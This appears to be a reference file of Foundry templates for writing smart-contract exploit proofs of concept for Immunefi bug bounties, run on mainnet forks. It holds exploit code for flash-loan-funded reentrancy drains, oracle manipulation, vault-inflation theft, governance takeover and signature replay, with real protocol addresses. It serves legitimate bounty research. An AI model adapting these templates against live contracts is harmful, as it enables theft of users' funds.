---
name: ref-foundry-poc-cookbook
description: "Foundry fork setup, flash loan interfaces, and exploit PoC templates for Immunefi submissions. Use when writing Web3 PoCs."
---

# Foundry PoC Cookbook

Practical templates for proving smart contract vulnerabilities on Immunefi. Every PoC must demonstrate actual fund loss or protocol damage on a mainnet fork.

## Prerequisites

```bash
# Install Foundry
curl -L https://foundry.paradigm.xyz | bash
foundryup

# Create PoC project
forge init poc-project && cd poc-project

# Common dependencies
forge install OpenZeppelin/openzeppelin-contracts
forge install aave/aave-v3-core
```

---

## 1. Mainnet Fork Setup

### RPC Configuration (foundry.toml)

```toml
[profile.default]
src = "src"
out = "out"
libs = ["lib"]
via_ir = false

[rpc_endpoints]
mainnet = "https://eth-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}"
arbitrum = "https://arb-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}"
optimism = "https://opt-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}"
base = "https://base-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}"
bsc = "https://bsc-dataseed1.binance.org"
polygon = "https://polygon-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}"
```

### Base Exploit Test Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

abstract contract BaseExploit is Test {
    uint256 internal fork;

    function setUp() public virtual {
        // Pin block for reproducibility (REQUIRED by Immunefi)
        fork = vm.createFork("mainnet", 19_500_000);
        vm.selectFork(fork);
    }

    // --- Helpers ---

    function logProfit(address token, uint256 before_, uint256 after_) internal view {
        uint8 dec = IERC20(token).decimals();
        string memory sym = IERC20(token).symbol();
        if (after_ > before_) {
            emit log_named_decimal_uint(
                string.concat("[PROFIT] ", sym), after_ - before_, dec
            );
        } else {
            emit log_named_decimal_uint(
                string.concat("[LOSS] ", sym), before_ - after_, dec
            );
        }
    }

    function labelAll() internal {
        vm.label(WETH, "WETH");
        vm.label(USDC, "USDC");
        vm.label(USDT, "USDT");
        vm.label(DAI, "DAI");
        vm.label(WBTC, "WBTC");
        vm.label(AAVE_POOL, "AaveV3Pool");
        vm.label(BALANCER_VAULT, "BalancerVault");
        vm.label(UNI_ROUTER, "UniV3Router");
    }

    // --- Mainnet Addresses (Ethereum) ---

    address constant WETH  = 0xC02aaA39b223FE8D0A0e5c4F27eAD9083C756Cc2;
    address constant USDC  = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant USDT  = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant DAI   = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant WBTC  = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;

    // Protocols
    address constant AAVE_POOL       = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address constant BALANCER_VAULT  = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address constant UNI_ROUTER      = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address constant UNI_FACTORY     = 0x1F98431c8aD98523631AE4a59f267346ea31F984;
    address constant CURVE_3POOL     = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;
    address constant SUSHI_ROUTER    = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;

    // --- Arbitrum Addresses ---
    address constant ARB_WETH = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
    address constant ARB_USDC = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831; // native USDC
    address constant ARB_AAVE = 0x794a61358D6845594F94dc1DB02A252b5b4814aD;

    // --- Base Addresses ---
    address constant BASE_WETH = 0x4200000000000000000000000000000000000006;
    address constant BASE_USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
}

interface IERC20 {
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}
```

---

## 2. Flash Loan Interfaces

### Aave V3 Flash Loan

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./BaseExploit.t.sol";

interface IPool {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;

    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata interestRateModes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IFlashLoanSimpleReceiver {
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool);
}

contract AaveFlashLoanExploit is BaseExploit, IFlashLoanSimpleReceiver {
    // Fee: 0.05% on Aave V3 (0.09% on some markets)
    // Max borrow: pool liquidity of the asset

    function testExploit() public {
        labelAll();
        uint256 borrowAmount = 1_000_000e6; // 1M USDC

        uint256 before_ = IERC20(USDC).balanceOf(address(this));

        // Initiate flash loan
        IPool(AAVE_POOL).flashLoanSimple(
            address(this), // receiver
            USDC,          // asset
            borrowAmount,  // amount
            "",            // params (passed to callback)
            0              // referralCode
        );

        logProfit(USDC, before_, IERC20(USDC).balanceOf(address(this)));
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata /* params */
    ) external override returns (bool) {
        require(msg.sender == AAVE_POOL, "not pool");
        require(initiator == address(this), "not initiator");

        // ============================================
        // YOUR EXPLOIT LOGIC HERE
        // You have `amount` tokens available
        // ============================================

        // ... manipulate price, drain vault, etc ...

        // Repay flash loan + fee
        uint256 repayAmount = amount + premium;
        IERC20(asset).approve(AAVE_POOL, repayAmount);
        return true;
    }
}
```

### Balancer Flash Loan (Zero Fee)

```solidity
interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IFlashLoanRecipient {
    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

contract BalancerFlashExploit is BaseExploit, IFlashLoanRecipient {
    // Fee: 0% (Balancer flash loans are FREE)
    // Preferred for maximum profit demonstration

    function testExploit() public {
        labelAll();

        address[] memory tokens = new address[](1);
        tokens[0] = WETH;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 10_000 ether; // 10K WETH

        IBalancerVault(BALANCER_VAULT).flashLoan(
            address(this), tokens, amounts, ""
        );
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory /* userData */
    ) external override {
        require(msg.sender == BALANCER_VAULT, "not vault");

        // ============================================
        // YOUR EXPLOIT LOGIC HERE (fee = 0!)
        // ============================================

        // Repay (just the principal, no fee)
        IERC20(tokens[0]).transfer(BALANCER_VAULT, amounts[0] + feeAmounts[0]);
    }
}
```

### Uniswap V3 Flash (Fee = Pool Fee Tier)

```solidity
interface IUniswapV3Pool {
    function flash(
        address recipient,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;

    function token0() external view returns (address);
    function token1() external view returns (address);
    function fee() external view returns (uint24);
}

interface IUniswapV3Factory {
    function getPool(address, address, uint24) external view returns (address);
}

contract UniV3FlashExploit is BaseExploit {
    // Fee: same as pool fee tier (0.05%, 0.3%, or 1%)
    // Use for token pairs not available on Aave/Balancer

    function testExploit() public {
        // Get WETH/USDC 0.3% pool
        address pool = IUniswapV3Factory(UNI_FACTORY).getPool(WETH, USDC, 3000);

        // Flash borrow 1000 WETH (amount0) and 0 USDC (amount1)
        // token0/token1 order depends on address sort
        IUniswapV3Pool(pool).flash(
            address(this),
            1000 ether, // amount0 (USDC if USDC < WETH by address)
            0,          // amount1
            abi.encode("exploit")
        );
    }

    // Callback name is specific to Uniswap V3
    function uniswapV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata /* data */
    ) external {
        // YOUR EXPLOIT HERE

        // Repay: principal + fee
        address token0 = IUniswapV3Pool(msg.sender).token0();
        IERC20(token0).transfer(msg.sender, 1000 ether + fee0);
    }
}
```

---

## 3. Attack Templates

### 3a. Reentrancy Exploit

```solidity
contract ReentrancyExploit is BaseExploit {
    address target; // vulnerable contract
    uint256 attackCount;

    function testExploit() public {
        target = address(0xVULNERABLE); // replace
        vm.label(target, "VulnerableVault");

        // Fund attacker
        deal(WETH, address(this), 1 ether);
        IERC20(WETH).approve(target, type(uint256).max);

        uint256 before_ = IERC20(WETH).balanceOf(address(this));

        // Deposit to get shares/position
        IVault(target).deposit(1 ether);
        // Trigger withdrawal (calls back to us)
        IVault(target).withdraw(1 ether);

        logProfit(WETH, before_, IERC20(WETH).balanceOf(address(this)));
    }

    // Reentrancy callback — triggered by ETH transfer or token hook
    receive() external payable {
        if (attackCount < 5) {
            attackCount++;
            IVault(target).withdraw(1 ether);
        }
    }

    // For ERC-777 token hooks
    function tokensReceived(
        address, address, address, uint256, bytes calldata, bytes calldata
    ) external {
        if (attackCount < 5) {
            attackCount++;
            IVault(target).withdraw(1 ether);
        }
    }
}

interface IVault {
    function deposit(uint256) external;
    function withdraw(uint256) external;
}
```

### 3b. Oracle Manipulation (Uniswap Spot Price)

```solidity
interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory);
}

interface IUniswapV2Pair {
    function getReserves() external view returns (uint112, uint112, uint32);
    function token0() external view returns (address);
}

contract OracleManipExploit is BaseExploit, IFlashLoanRecipient {
    // Target: protocol using Uniswap spot price as oracle
    address constant TARGET_LENDING = address(0xTARGET);
    address constant MANIPULATED_PAIR = address(0xPAIR);

    function testExploit() public {
        labelAll();

        // Step 1: Flash loan large amount
        address[] memory tokens = new address[](1);
        tokens[0] = WETH;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 50_000 ether;

        IBalancerVault(BALANCER_VAULT).flashLoan(
            address(this), tokens, amounts, ""
        );
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external {
        // Step 2: Dump WETH into pair to crash price
        IERC20(WETH).approve(SUSHI_ROUTER, type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = USDC;

        IUniswapV2Router(SUSHI_ROUTER).swapExactTokensForTokens(
            amounts[0], 0, path, address(this), block.timestamp
        );

        // Step 3: Borrow from target at manipulated price
        // (target thinks WETH is cheap, lets us borrow more)
        // ILending(TARGET_LENDING).borrow(...)

        // Step 4: Swap back to restore price
        // ... reverse swap ...

        // Step 5: Repay flash loan
        IERC20(WETH).transfer(BALANCER_VAULT, amounts[0] + feeAmounts[0]);
    }
}
```

### 3c. ERC-4626 Vault Inflation (First Depositor Attack)

```solidity
contract VaultInflationExploit is BaseExploit {
    // Attack: first depositor donates to inflate share price,
    // causing subsequent depositors to receive 0 shares (rounding)

    address constant VAULT = address(0xTARGET_VAULT);
    address constant ASSET = USDC; // underlying

    function testExploit() public {
        labelAll();
        address victim = makeAddr("victim");

        // Attacker is first depositor
        deal(ASSET, address(this), 2e6); // 2 USDC
        deal(ASSET, victim, 1_000_000e6); // victim has 1M USDC

        IERC20(ASSET).approve(VAULT, type(uint256).max);

        // Step 1: Deposit minimal amount (1 wei of shares)
        IERC4626(VAULT).deposit(1, address(this));

        // Step 2: Donate large amount directly to vault
        // This inflates pricePerShare without minting new shares
        IERC20(ASSET).transfer(VAULT, 1_000_001e6);

        // Step 3: Victim deposits 1M USDC but gets 0 shares (rounded down)
        vm.startPrank(victim);
        IERC20(ASSET).approve(VAULT, type(uint256).max);
        uint256 victimShares = IERC4626(VAULT).deposit(1_000_000e6, victim);
        vm.stopPrank();

        emit log_named_uint("Victim shares received", victimShares);
        // victimShares == 0 means victim lost everything

        // Step 4: Attacker redeems their 1 share for all assets
        uint256 attackerRedeemed = IERC4626(VAULT).redeem(
            IERC4626(VAULT).balanceOf(address(this)),
            address(this),
            address(this)
        );
        emit log_named_decimal_uint("Attacker redeemed", attackerRedeemed, 6);
    }
}

interface IERC4626 {
    function deposit(uint256 assets, address receiver) external returns (uint256);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function totalAssets() external view returns (uint256);
    function totalSupply() external view returns (uint256);
}
```

### 3d. Governance Flash Loan Attack

```solidity
contract GovernanceExploit is BaseExploit, IFlashLoanRecipient {
    address constant GOV_TOKEN = address(0xGOV);
    address constant GOVERNOR = address(0xGOVERNOR);

    function testExploit() public {
        // Flash loan governance tokens → vote → return
        address[] memory tokens = new address[](1);
        tokens[0] = GOV_TOKEN;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 10_000_000e18; // enough to pass quorum

        IBalancerVault(BALANCER_VAULT).flashLoan(
            address(this), tokens, amounts, ""
        );
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external {
        // Delegate voting power to self
        IVotes(GOV_TOKEN).delegate(address(this));

        // Advance 1 block (snapshot taken at proposal creation)
        vm.roll(block.number + 1);

        // Create malicious proposal (e.g., transfer treasury)
        // IGovernor(GOVERNOR).propose(...)

        // Vote
        // IGovernor(GOVERNOR).castVote(proposalId, 1); // 1 = For

        // Repay
        IERC20(tokens[0]).transfer(BALANCER_VAULT, amounts[0] + feeAmounts[0]);
    }
}

interface IVotes {
    function delegate(address) external;
    function getVotes(address) external view returns (uint256);
}
```

### 3e. Cross-Chain Signature Replay

```solidity
contract SignatureReplayExploit is BaseExploit {
    // Attack: signature valid on chain A replayed on chain B
    // Common when contract doesn't include chainId in signed message

    address constant TARGET = address(0xTARGET);

    function testExploit() public {
        // Fork chain B (where we replay)
        // Signature was captured from chain A transaction

        // Reconstruct the signed message WITHOUT chainId
        bytes32 digest = keccak256(abi.encodePacked(
            "\x19\x01",
            // domainSeparator WITHOUT chainId — vulnerable!
            keccak256(abi.encode(
                keccak256("EIP712Domain(string name,string version,address verifyingContract)"),
                keccak256("ProtocolName"),
                keccak256("1"),
                TARGET // same address on both chains (CREATE2)
            )),
            // structHash
            keccak256(abi.encode(
                keccak256("Transfer(address to,uint256 amount,uint256 nonce)"),
                address(this),
                1000e18,
                0 // nonce 0 — already used on chain A but not chain B
            ))
        ));

        // Use the same v, r, s from chain A transaction
        // (v, r, s) = extracted from etherscan/block explorer
        // ITarget(TARGET).executeWithSignature(to, amount, nonce, v, r, s);
    }
}
```

---

## 4. Utility Cheatcodes

### State Manipulation

```solidity
// Impersonate any address
vm.startPrank(0xWhale);
// ... calls as whale ...
vm.stopPrank();

// Single call as address
vm.prank(0xWhale);
target.doSomething();

// Give tokens to address (overwrites storage)
deal(USDC, address(this), 1_000_000e6);
deal(WETH, address(this), 100 ether);

// Give ETH
vm.deal(address(this), 100 ether);

// Manipulate specific storage slot
bytes32 slot = keccak256(abi.encode(address(this), uint256(0))); // mapping slot
vm.store(target, slot, bytes32(uint256(1_000_000e18)));

// Read storage
bytes32 value = vm.load(target, slot);

// Time travel
vm.warp(block.timestamp + 1 days);  // advance time
vm.roll(block.number + 100);         // advance blocks

// Snapshot and revert (for multi-step testing)
uint256 snap = vm.snapshot();
// ... do stuff ...
vm.revertTo(snap); // reset to snapshot

// Create labeled address
address attacker = makeAddr("attacker");
address victim = makeAddr("victim");

// Label existing addresses (shows in traces)
vm.label(AAVE_POOL, "AaveV3Pool");
```

### Finding Storage Slots

```bash
# Get storage layout of a contract
forge inspect src/Contract.sol:Contract storage-layout

# Read storage from forked state
cast storage 0xContractAddress 0 --rpc-url $RPC  # slot 0
cast storage 0xContractAddress 5 --rpc-url $RPC  # slot 5

# Calculate mapping slot: keccak256(abi.encode(key, baseSlot))
cast keccak 0x000000000000000000000000YOUR_ADDRESS0000000000000000000000000000000000000000000000000000000000000003
```

---

## 5. Running and Debugging

```bash
# Run specific exploit test
forge test --match-test testExploit -vvvv --fork-url $RPC

# Verbosity levels:
# -v    = show logs
# -vv   = show logs + emits
# -vvv  = show logs + emits + traces for failing tests
# -vvvv = show traces for ALL tests (use this for exploits)

# Gas snapshot (prove feasibility)
forge test --match-test testExploit --gas-report --fork-url $RPC

# Estimate if attack is profitable after gas
cast estimate --rpc-url $RPC --from 0xAttacker 0xTarget "exploit()" --value 0

# Debug specific test interactively
forge debug --match-test testExploit --fork-url $RPC
```

---

## 6. Immunefi PoC Requirements

1. **Reproducible** — pin fork block number, include all addresses
2. **Demonstrates impact** — log before/after balances showing profit or loss
3. **Self-contained** — single test file, no external dependencies beyond forge-std
4. **Commented** — explain each step (reviewer must understand the attack)
5. **Realistic** — use actual mainnet state, not mocked contracts
6. **Profitable after gas** — show net profit exceeds gas cost

### Output Format Expected by Immunefi

```
Running 1 test for test/Exploit.t.sol:ExploitTest
[PASS] testExploit() (gas: 1234567)
Logs:
  [BEFORE] Attacker USDC balance: 0.000000
  [STEP 1] Flash loaned 1000000.000000 USDC from Balancer
  [STEP 2] Manipulated oracle price from 2000 to 500
  [STEP 3] Borrowed 4x collateral at manipulated price
  [STEP 4] Restored oracle price
  [PROFIT] USDC: 250000.000000
  [INFO] Gas used: ~500000 (~$0.50 at 10 gwei)
  [INFO] Net profit: $249,999.50
```

### Common Mistakes That Get Reports Rejected

- Using `deal()` to give yourself tokens you wouldn't have (unrealistic starting state)
- Not accounting for flash loan fees in profit calculation
- Manipulating oracle that has TWAP protection (need multi-block which isn't possible in single tx)
- Assuming you can front-run when MEV protection exists (Flashbots Protect, private mempool)
- Testing against outdated contract version (always verify current implementation via proxy)
- Not checking if the pool has enough liquidity for your flash loan amount
